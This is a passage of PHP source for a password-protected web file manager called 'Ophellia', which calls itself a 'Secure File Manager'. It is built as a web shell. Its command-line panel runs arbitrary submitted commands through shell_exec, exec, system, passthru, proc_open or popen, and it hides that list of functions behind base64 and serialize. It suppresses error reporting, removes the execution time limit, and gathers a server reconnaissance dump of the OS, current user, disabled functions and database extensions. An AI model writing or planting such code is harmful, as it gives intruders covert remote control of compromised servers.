    echo '<a href="?cd=' . encryptPath($dir) . '" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>';
    echo 'Cancel';
    echo '</a>';
    echo '</div>';

    echo '</form>';
    echo '</div>';
    echo '</div>';
}

function newFolder(string $dir): void
{
    if (isset($_POST['foldername'])) {
        if (empty($_POST['foldername'])) {
            showAlert("Folder name cannot be empty!", "error");
            displayNewFolderForm($dir);
            return;
        }

        $foldername = $dir . DIRECTORY_SEPARATOR . $_POST['foldername'];
        mkdir($foldername, 0755);

        // Reset POST data and show file manager
        $_POST = array();
        showAlert("Folder created successfully!", "success");
        fileManager($dir);
        return;
    }

    displayNewFolderForm($dir);
}

function displayNewFolderForm(string $dir): void
{
    echo '<div class="max-w-lg mx-auto">';
    echo '<div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">';

    // Header
    echo '<div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">';
    echo '<h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">';
    echo '<div class="p-2 bg-surface rounded-xl shadow-sm mr-3">';
    echo '<svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 13h6m-3-3v6m-9-6h.01M19 13h.01M19 19h.01M5 19h.01M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path></svg>';
    echo '</div>';
    echo 'Create New Folder';
    echo '</h2>';
    echo '</div>';

    echo '<form method="post">';

    echo '<div class="p-4 sm:p-6 space-y-4">';

    // Location
    echo '<div class="p-3 bg-surface-container rounded-xl border border-outline-variant">';
    echo '<span class="text-sm text-on-surface-variant">Location:</span>';
    echo '<span class="ml-2 text-sm font-mono text-on-surface break-all">' . htmlspecialchars($dir) . '</span>';
    echo '</div>';

    // Folder Name
    echo '<div>';
    echo '<label class="block text-sm font-medium text-on-surface mb-2">Folder Name</label>';
    echo '<input type="text" name="foldername" class="w-full px-4 py-2.5 bg-surface border border-outline-variant rounded-xl focus:outline-none focus:ring-2 focus:ring-primary text-on-surface placeholder-on-surface-variant transition-shadow" placeholder="Enter folder name" required>';
    echo '</div>';

    echo '</div>';

    // Actions
    echo '<div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">';
    echo '<button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>';
    echo 'Create Folder';
    echo '</button>';

    echo '<a href="?cd=' . encryptPath($dir) . '" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>';
    echo 'Cancel';
    echo '</a>';
    echo '</div>';

    echo '</form>';
    echo '</div>';
    echo '</div>';
}

function getFunctionalCmd(string $cmd): string
{
    $funcs = ['shell_exec', 'exec', 'system', 'passthru', 'proc_open', 'popen'];
    $obfuscated = base64_encode(serialize($funcs));
    $deobfuscate = function ($x) {
        return unserialize(base64_decode($x));
    };

    foreach ($deobfuscate($obfuscated) as $func) {
        if (function_exists($func)) {
            return obfuscatedExecution($func, $cmd);
        }
    }

    return "No available function to execute command.";
}

function obfuscatedExecution(string $func, string $cmd): string
{
    $encoded = base64_encode($cmd);
    $decoded = base64_decode($encoded);

    switch ($func) {
        case 'shell_exec':
            $output = call_user_func($func, $decoded);
            return $output !== null ? $output : 'Command failed or returned no output';
        case 'exec':
            $output = [];
            call_user_func($func, $decoded, $output);
            return implode("\n", $output);
        case 'system':
        case 'passthru':
            ob_start();
            call_user_func($func, $decoded);
            return ob_get_clean();
        case 'proc_open':
            return executeWithProc_open($decoded);
        case 'popen':
            return executeWithPopen($decoded);
        default:
            return "Unknown function: $func";
    }
}

function executeWithProc_open(string $cmd): string
{
    $spec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
    $proc = call_user_func('proc_open', $cmd, $spec, $pipes);
    if (is_resource($proc)) {
        fclose($pipes[0]);
        $out = stream_get_contents($pipes[1]);
        $err = stream_get_contents($pipes[2]);
        array_map('fclose', array_slice($pipes, 1));
        proc_close($proc);
        return $err ? "Error: $err" : $out;
    }
    return "Failed to execute command using proc_open.";
}

function executeWithPopen(string $cmd): string
{
    $handle = call_user_func('popen', $cmd, 'r');
    if ($handle) {
        $output = stream_get_contents($handle);
        pclose($handle);
        return $output;
    }
    return "Failed to execute command using popen.";
}

function commandLine(string $dir): void
{
    $output = '';
    if (isset($_POST['command'])) {
        $command = $_POST['command'];
        chdir($dir);

        $output = getFunctionalCmd($command);
    }

    echo '<div class="max-w-6xl mx-auto">';
    echo '<div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">';

    // Header
    echo '<div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">';
    echo '<h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">';
    echo '<div class="p-2 bg-surface rounded-xl shadow-sm mr-3">';
    echo '<svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>';
    echo '</div>';
    echo 'Command Line';
    echo '</h2>';
    echo '</div>';

    echo '<div class="p-4 sm:p-6">';

    // Working directory
    echo '<div class="mb-4 p-3 bg-surface-container rounded-xl border border-outline-variant">';
    echo '<span class="text-sm text-on-surface-variant">Working directory:</span>';
    echo '<span class="ml-2 text-sm font-mono text-on-surface break-all">' . htmlspecialchars($dir) . '</span>';
    echo '</div>';

    // Command form
    echo '<form method="post" class="mb-4">';
    echo '<div class="flex flex-col sm:flex-row gap-2">';
    echo '<div class="flex-1">';
    echo '<div class="relative">';
    echo '<div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">';
    echo '<span class="text-primary font-mono font-bold">$</span>';
    echo '</div>';
    echo '<input type="text" name="command" class="w-full pl-10 pr-4 py-3 bg-surface-container border border-outline-variant rounded-xl focus:outline-none focus:ring-2 focus:ring-primary text-on-surface placeholder-on-surface-variant transition-all font-mono text-sm" placeholder="Enter command (e.g., ls -la)" autocomplete="off">';
    echo '</div>';
    echo '</div>';

    echo '<button type="submit" class="flex items-center justify-center px-5 py-3 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium whitespace-nowrap">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>';
    echo 'Execute';
    echo '</button>';
    echo '</div>';
    echo '</form>';

    // Output section
    if (!empty($output)) {
        echo '<div class="mt-4">';
        echo '<div class="flex items-center mb-3">';
        echo '<div class="p-1.5 bg-surface-container-high rounded-lg mr-2">';
        echo '<svg class="h-4 w-4 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>';
        echo '</div>';
        echo '<h3 class="font-semibold text-on-surface">Output</h3>';
        echo '</div>';
        echo '<div class="bg-surface-container-highest text-primary p-4 rounded-xl overflow-auto max-h-[50vh] sm:max-h-[60vh] font-mono text-xs sm:text-sm leading-relaxed scrollbar-thin">';
        echo '<pre class="whitespace-pre-wrap">' . htmlspecialchars($output) . '</pre>';
        echo '</div>';
        echo '</div>';
    } else {
        echo '<div class="p-6 bg-surface-container border border-outline-variant rounded-xl text-center">';
        echo '<div class="inline-flex items-center justify-center w-12 h-12 rounded-full bg-surface-container-high mb-3">';
        echo '<svg class="h-6 w-6 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>';
        echo '</div>';
        echo '<p class="text-on-surface-variant">Enter a command and press Execute</p>';
        echo '</div>';
    }

    echo '</div>';
    echo '</div>';
    echo '</div>';
}

function renameFile(string $file): void
{
    $dirname = dirname($file);

    if (isset($_POST['newname'])) {
        if (empty($_POST['newname'])) {
            showAlert("New name cannot be empty!", "error");
            displayRenameForm($file);
            return;
        }

        $newname = $dirname . DIRECTORY_SEPARATOR . $_POST['newname'];
        rename($file, $newname);

        // Reset POST data and show file manager
        $_POST = array();
        showAlert("File renamed successfully!", "success");
        fileManager($dirname);
        return;
    }

    displayRenameForm($file);
}

function displayRenameForm(string $file): void
{
    $dirname = dirname($file);
    $isDir = is_dir($file);

    echo '<div class="max-w-lg mx-auto">';
    echo '<div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">';

    // Header
    echo '<div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">';
    echo '<h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">';
    echo '<div class="p-2 bg-surface rounded-xl shadow-sm mr-3">';
    echo '<svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path></svg>';
    echo '</div>';
    echo 'Rename ' . ($isDir ? 'Directory' : 'File');
    echo '</h2>';
    echo '</div>';

    echo '<form method="post">';

    echo '<div class="p-4 sm:p-6 space-y-4">';

    // Current name
    echo '<div class="p-3 bg-surface-container rounded-xl border border-outline-variant">';
    echo '<span class="text-sm text-on-surface-variant">Current name:</span>';
    echo '<span class="ml-2 text-sm font-medium text-on-surface break-all">' . htmlspecialchars(basename($file)) . '</span>';
    echo '</div>';

    // New name
    echo '<div>';
    echo '<label class="block text-sm font-medium text-on-surface mb-2">New Name</label>';
    echo '<input type="text" name="newname" value="' . htmlspecialchars(basename($file)) . '" class="w-full px-4 py-2.5 bg-surface border border-outline-variant rounded-xl focus:outline-none focus:ring-2 focus:ring-primary text-on-surface transition-shadow" required>';
    echo '</div>';

    echo '</div>';

    // Actions
    echo '<div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">';
    echo '<button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>';
    echo 'Rename';
    echo '</button>';

    echo '<a href="?cd=' . encryptPath($dirname) . '" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>';
    echo 'Cancel';
    echo '</a>';
    echo '</div>';

    echo '</form>';
    echo '</div>';
    echo '</div>';
}

function chmodFile(string $file): void
{
    $dirname = dirname($file);

    if (isset($_POST['permission'])) {
        if (!preg_match('/^[0-7]{3,4}$/', $_POST['permission'])) {
            showAlert("Invalid permission format!", "error");
            displayChmodForm($file);
            return;
        }

        $permission = octdec($_POST['permission']);
        chmod($file, $permission);

        // Reset POST data and show file manager
        $_POST = array();
        showAlert("Permissions changed successfully!", "success");
        fileManager($dirname);
        return;
    }

    displayChmodForm($file);
}

function displayChmodForm(string $file): void
{
    $dirname = dirname($file);
    $isDir = is_dir($file);
    $currentPerms = substr(sprintf('%o', fileperms($file)), -4);

    echo '<div class="max-w-lg mx-auto">';
    echo '<div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">';

    // Header
    echo '<div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">';
    echo '<h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">';
    echo '<div class="p-2 bg-surface rounded-xl shadow-sm mr-3">';
    echo '<svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>';
    echo '</div>';
    echo 'Change Permissions';
    echo '</h2>';
    echo '</div>';

    echo '<form method="post">';

    echo '<div class="p-4 sm:p-6 space-y-4">';

    // File info
    echo '<div class="p-3 bg-surface-container rounded-xl border border-outline-variant space-y-1">';
    echo '<div class="flex justify-between"><span class="text-sm text-on-surface-variant">File:</span><span class="text-sm font-medium text-on-surface truncate max-w-[200px]" title="' . htmlspecialchars(basename($file)) . '">' . htmlspecialchars(basename($file)) . '</span></div>';
    echo '<div class="flex justify-between"><span class="text-sm text-on-surface-variant">Current:</span><span class="text-sm font-mono font-medium text-primary">' . $currentPerms . '</span></div>';
    echo '</div>';

    // New permissions
    echo '<div>';
    echo '<label class="block text-sm font-medium text-on-surface mb-2">New Permissions (octal)</label>';
    echo '<input type="text" name="permission" value="' . $currentPerms . '" class="w-full px-4 py-2.5 bg-surface border border-outline-variant rounded-xl font-mono focus:outline-none focus:ring-2 focus:ring-primary text-on-surface transition-shadow" required pattern="[0-7]{3,4}" placeholder="e.g. 0755">';
    echo '</div>';

    // Permission explanation
    echo '<div class="p-4 bg-surface-container-high border border-outline-variant rounded-xl text-sm">';
    echo '<p class="font-semibold text-on-surface mb-2">Common permissions:</p>';
    echo '<div class="space-y-2">';
    echo '<div class="flex items-center justify-between"><span class="font-mono text-primary bg-surface px-2 py-0.5 rounded">0755</span><span class="text-on-surface-variant">Directory (drwxr-xr-x)</span></div>';
    echo '<div class="flex items-center justify-between"><span class="font-mono text-primary bg-surface px-2 py-0.5 rounded">0644</span><span class="text-on-surface-variant">File (-rw-r--r--)</span></div>';
    echo '<div class="flex items-center justify-between"><span class="font-mono text-primary bg-surface px-2 py-0.5 rounded">0777</span><span class="text-on-surface-variant">Full access</span></div>';
    echo '</div>';
    echo '</div>';

    echo '</div>';

    // Actions
    echo '<div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">';
    echo '<button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>';
    echo 'Change';
    echo '</button>';

    echo '<a href="?cd=' . encryptPath($dirname) . '" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>';
    echo 'Cancel';
    echo '</a>';
    echo '</div>';

    echo '</form>';
    echo '</div>';
    echo '</div>';
}

function deleteFile(string $file): bool
{
    $isDir = is_dir($file);

    if ($isDir) {
        // For directories, try to remove recursively
        $success = deleteDirectory($file);
    } else {
        // For files, simply unlink
        $success = @unlink($file);
    }

    return $success;
}

function deleteDirectory(string $dir): bool
{
    if (!is_dir($dir)) {
        return false;
    }

    $objects = scandir($dir);
    foreach ($objects as $object) {
        if ($object !== '.' && $object !== '..') {
            $path = $dir . DIRECTORY_SEPARATOR . $object;
            if (is_dir($path)) {
                deleteDirectory($path);
            } else {
                @unlink($path);
            }
        }
    }

    return @rmdir($dir);
}

function fileManager(string $dir): void
{
    echo '<div id="file-manager-content">';
    echo renderFileTable($dir);
    echo '</div>';
}

session_start();
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '256M');

// Handle AJAX delete request
if (isset($_POST['ajax_delete'])) {
    if (authenticate()) {
        $file = decryptPath($_POST['path']);
        $dirname = dirname($file);
        $isDir = is_dir($file);
        $success = deleteFile($file);

        $message = ($isDir ? "Directory" : "File") . ($success ? " deleted successfully" : " deletion failed");

        header('Content-Type: application/json');
        echo json_encode([
            'success' => $success,
            'message' => $message,
            'fileTableHtml' => renderFileTable($dirname)
        ]);
    } else {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => false,
            'message' => 'Authentication failed'
        ]);
    }
    exit;
}

// Handle AJAX rename request
if (isset($_POST['ajax_rename'])) {
    if (authenticate()) {
        $file = decryptPath($_POST['path']);
        $dirname = dirname($file);
        $newname = $_POST['newname'] ?? '';

        if (empty($newname)) {
            header('Content-Type: application/json');
            echo json_encode([
                'success' => false,
                'message' => 'New name cannot be empty'
            ]);
            exit;
        }

        $newPath = $dirname . DIRECTORY_SEPARATOR . $newname;
        $success = rename($file, $newPath);
        $isDir = is_dir($newPath);

        header('Content-Type: application/json');
        echo json_encode([
            'success' => $success,
            'message' => ($isDir ? "Directory" : "File") . ($success ? " renamed successfully" : " rename failed"),
            'fileTableHtml' => renderFileTable($dirname)
        ]);
    } else {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => false,
            'message' => 'Authentication failed'
        ]);
    }
    exit;
}

// Handle AJAX chmod request
if (isset($_POST['ajax_chmod'])) {
    if (authenticate()) {
        $file = decryptPath($_POST['path']);
        $dirname = dirname($file);
        $permission = $_POST['permission'] ?? '';

        if (!preg_match('/^[0-7]{3,4}$/', $permission)) {
            header('Content-Type: application/json');
            echo json_encode([
                'success' => false,
                'message' => 'Invalid permission format'
            ]);
            exit;
        }

        $success = chmod($file, octdec($permission));

        header('Content-Type: application/json');
        echo json_encode([
            'success' => $success,
            'message' => $success ? "Permissions changed successfully" : "Failed to change permissions",
            'fileTableHtml' => renderFileTable($dirname)
        ]);
    } else {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => false,
            'message' => 'Authentication failed'
        ]);
    }
    exit;
}

// Handle AJAX new file request
if (isset($_POST['ajax_newfile'])) {
    if (authenticate()) {
        $dir = decryptPath($_POST['path']);
        $filename = $_POST['filename'] ?? '';
        $content = $_POST['content'] ?? '';

        if (empty($filename)) {
            header('Content-Type: application/json');
            echo json_encode([
                'success' => false,
                'message' => 'Filename cannot be empty'
            ]);
            exit;
        }

        $filepath = $dir . DIRECTORY_SEPARATOR . $filename;
        $success = file_put_contents($filepath, $content) !== false;

        header('Content-Type: application/json');
        echo json_encode([
            'success' => $success,
            'message' => $success ? "File created successfully" : "Failed to create file",
            'fileTableHtml' => renderFileTable($dir)
        ]);
    } else {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => false,
            'message' => 'Authentication failed'
        ]);
    }
    exit;
}

// Handle AJAX new folder request
if (isset($_POST['ajax_newfolder'])) {
    if (authenticate()) {
        $dir = decryptPath($_POST['path']);
        $foldername = $_POST['foldername'] ?? '';

        if (empty($foldername)) {
            header('Content-Type: application/json');
            echo json_encode([
                'success' => false,
                'message' => 'Folder name cannot be empty'
            ]);
            exit;
        }

        $folderpath = $dir . DIRECTORY_SEPARATOR . $foldername;
        $success = mkdir($folderpath, 0755, true);

        header('Content-Type: application/json');
        echo json_encode([
            'success' => $success,
            'message' => $success ? "Folder created successfully" : "Failed to create folder",
            'fileTableHtml' => renderFileTable($dir)
        ]);
    } else {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => false,
            'message' => 'Authentication failed'
        ]);
    }
    exit;
}

// Handle AJAX command request
if (isset($_POST['ajax_command'])) {
    if (authenticate()) {
        $dir = decryptPath($_POST['path']);
        $command = $_POST['command'] ?? '';

        if (empty($command)) {
            header('Content-Type: application/json');
            echo json_encode([
                'success' => false,
                'message' => 'Command cannot be empty'
            ]);
            exit;
        }

        chdir($dir);
        $output = getFunctionalCmd($command);

        header('Content-Type: application/json');
        echo json_encode([
            'success' => true,
            'output' => $output
        ]);
    } else {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => false,
            'message' => 'Authentication failed'
        ]);
    }
    exit;
}

// Handle AJAX info request
if (isset($_POST['ajax_info'])) {
    header('Content-Type: application/json');

    if (!authenticate()) {
        echo json_encode([
            'success' => false,
            'message' => 'Authentication failed'
        ]);
        exit;
    }

    try {
        $info = [];

        // PHP Info
        $info['php'] = [
            'version' => PHP_VERSION,
            'sapi' => php_sapi_name(),
            'extensions' => get_loaded_extensions(),
            'ini_path' => php_ini_loaded_file() ?: 'N/A',
            'memory_limit' => ini_get('memory_limit') ?: 'N/A',
            'max_execution_time' => ini_get('max_execution_time') ?: '0',
            'upload_max_filesize' => ini_get('upload_max_filesize') ?: 'N/A',
            'post_max_size' => ini_get('post_max_size') ?: 'N/A',
            'display_errors' => ini_get('display_errors') ?: '0',
            'error_reporting' => error_reporting(),
        ];

        // Server Info
        $info['server'] = [
            'software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
            'name' => $_SERVER['SERVER_NAME'] ?? 'N/A',
            'protocol' => $_SERVER['SERVER_PROTOCOL'] ?? 'N/A',
            'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? 'N/A',
            'remote_addr' => $_SERVER['REMOTE_ADDR'] ?? 'N/A',
            'server_addr' => $_SERVER['SERVER_ADDR'] ?? 'N/A',
        ];

        // System Info
        $info['system'] = [
            'os' => PHP_OS,
            'os_family' => defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY : PHP_OS,
            'hostname' => @gethostname() ?: 'N/A',
            'uname' => @php_uname() ?: 'N/A',
            'current_user' => @get_current_user() ?: 'N/A',
            'current_dir' => @getcwd() ?: 'N/A',
            'temp_dir' => @sys_get_temp_dir() ?: 'N/A',
        ];

        // Disk Info
        $diskTotal = @disk_total_space('/');
        $diskFree = @disk_free_space('/');
        $info['disk'] = [
            'total' => $diskTotal ? formatSize((int)$diskTotal) : 'N/A',
            'free' => $diskFree ? formatSize((int)$diskFree) : 'N/A',
        ];

        // Database Extensions
        $dbExtensions = ['mysqli', 'pdo_mysql', 'pgsql', 'pdo_pgsql', 'sqlite3', 'pdo_sqlite', 'mongodb'];
        $info['databases'] = array_values(array_filter($dbExtensions, 'extension_loaded'));

        // Disabled Functions
        $disabledFunctions = ini_get('disable_functions');
        $info['disabled_functions'] = $disabledFunctions ? array_map('trim', explode(',', $disabledFunctions)) : [];

        echo json_encode([
            'success' => true,
            'info' => $info
        ]);
    } catch (Exception $e) {
        echo json_encode([
            'success' => false,
            'message' => 'Error: ' . $e->getMessage()
        ]);
    }
    exit;
}

// Handle download
if (isset($_GET['download'])) {
    $file = decryptPath($_GET['download']);
    downloadFile($file);
    exit;
}

if (!authenticate()) {
    $loginTheme = THEME === 'dark' ? [
        'bg' => '#1A110F',
        'surface' => '#271D1A',
        'surfaceContainer' => '#322825',
        'text' => '#F1DFD9',
        'textVariant' => '#D8C2BB',
        'primary' => '#FFB59C',
        'primaryHover' => '#E7A08A',
        'onPrimary' => '#55200C',
        'border' => '#53433F',
    ] : [
        'bg' => '#FFF8F6',
        'surface' => '#FFFFFF',
        'surfaceContainer' => '#FCEAE5',
        'text' => '#231917',
        'textVariant' => '#53433F',
        'primary' => '#8F4C35',
        'primaryHover' => '#723520',
        'onPrimary' => '#FFFFFF',
        'border' => '#D8C2BB',
    ];
    echo '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Authentication</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <style>
            body { background-color: ' . $loginTheme['bg'] . '; }
        </style>
    </head>
    <body class="flex items-center justify-center min-h-screen">
        <div style="background-color: ' . $loginTheme['surface'] . '; border: 1px solid ' . $loginTheme['border'] . ';" class="p-8 rounded-lg shadow-xl w-96 max-w-md">
            <div class="text-center mb-8">
                <h1 style="color: ' . $loginTheme['primary'] . ';" class="text-3xl font-bold mb-2">Ophellia ' . VERSION . '</h1>
                <p style="color: ' . $loginTheme['textVariant'] . ';">Secure File Manager</p>
            </div>

            <form method="post" action="">
                <div class="mb-5">
                    <label for="password" style="color: ' . $loginTheme['text'] . ';" class="block font-medium mb-2">Password</label>
                    <div class="relative">
                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                            <svg style="color: ' . $loginTheme['textVariant'] . ';" class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                            </svg>
                        </div>
                        <input type="password" id="password" name="password" style="background-color: ' . $loginTheme['surfaceContainer'] . '; border-color: ' . $loginTheme['border'] . '; color: ' . $loginTheme['text'] . ';" class="pl-10 w-full p-3 border rounded-lg focus:outline-none focus:ring-2" placeholder="Enter password" autofocus>
                    </div>
                </div>
                <button type="submit" style="background-color: ' . $loginTheme['primary'] . '; color: ' . $loginTheme['onPrimary'] . ';" class="w-full py-3 rounded-lg hover:opacity-90 transition-opacity flex items-center justify-center">
                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 16l-4-4m0 0l4-4m-4 4h14m-5 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h7a3 3 0 013 3v1"></path>
                    </svg>
                    Login
                </button>
            </form>

            <div class="mt-6 text-center text-sm" style="color: ' . $loginTheme['textVariant'] . ';">
                <p>&copy; ' . date('Y') . ' Ophellia File Manager</p>
            </div>
        </div>
    </body>
    </html>';
    exit;
}

$currentDir = isset($_GET['cd']) ? decryptPath($_GET['cd']) : getcwd();
if (!file_exists($currentDir) || !is_dir($currentDir)) {
    $currentDir = getcwd();
}

$currentUser = getCurrentUser();
$currentTime = date('Y-m-d H:i:s');

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ophellia
        <?= VERSION ?>
    </title>
    <script src="https://cdn.tailwindcss.com"></script>
    <?php
    // Theme configuration based on THEME constant
    $themeColors = THEME === 'dark' ? [
        'background' => '#1A110F',
        'surface' => '#1A110F',
        'surface-dim' => '#1A110F',
        'surface-container-lowest' => '#140C0A',
        'surface-container-low' => '#231917',
        'surface-container' => '#271D1A',
        'surface-container-high' => '#322825',
        'surface-container-highest' => '#3D322F',
        'surface-bright' => '#423733',
        'on-background' => '#F1DFD9',
        'on-surface' => '#F1DFD9',
        'on-surface-variant' => '#D8C2BB',
        'outline' => '#A08D87',
        'outline-variant' => '#53433F',
        'primary' => '#FFB59C',
        'primary-hover' => '#E7A08A',
        'on-primary' => '#55200C',
        'error' => '#FFB4AB',
        'on-error' => '#690005',
        'error-container' => '#93000A',
        'on-error-container' => '#FFDAD6',
        'success' => '#D6C68D',
        'warning' => '#E7BDB0',
    ] : [
        'background' => '#FFF8F6',
        'surface' => '#FFF8F6',
        'surface-dim' => '#E8D6D1',
        'surface-container-lowest' => '#FFFFFF',
        'surface-container-low' => '#FFF1ED',
        'surface-container' => '#FCEAE5',
        'surface-container-high' => '#F7E4DF',
        'surface-container-highest' => '#F1DFD9',
        'surface-bright' => '#FFF8F6',
        'on-background' => '#231917',
        'on-surface' => '#231917',
        'on-surface-variant' => '#53433F',
        'outline' => '#85736E',
        'outline-variant' => '#D8C2BB',
        'primary' => '#8F4C35',
        'primary-hover' => '#723520',
        'on-primary' => '#FFFFFF',
        'error' => '#BA1A1A',
        'on-error' => '#FFFFFF',
        'error-container' => '#FFDAD6',
        'on-error-container' => '#410002',
        'success' => '#6A5E2F',
        'warning' => '#77574C',
    ];
    ?>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'background': '<?= $themeColors['background'] ?>',
                        'surface': '<?= $themeColors['surface'] ?>',
                        'surface-dim': '<?= $themeColors['surface-dim'] ?>',
                        'surface-container-lowest': '<?= $themeColors['surface-container-lowest'] ?>',
                        'surface-container-low': '<?= $themeColors['surface-container-low'] ?>',
                        'surface-container': '<?= $themeColors['surface-container'] ?>',
                        'surface-container-high': '<?= $themeColors['surface-container-high'] ?>',
                        'surface-container-highest': '<?= $themeColors['surface-container-highest'] ?>',
                        'surface-bright': '<?= $themeColors['surface-bright'] ?>',
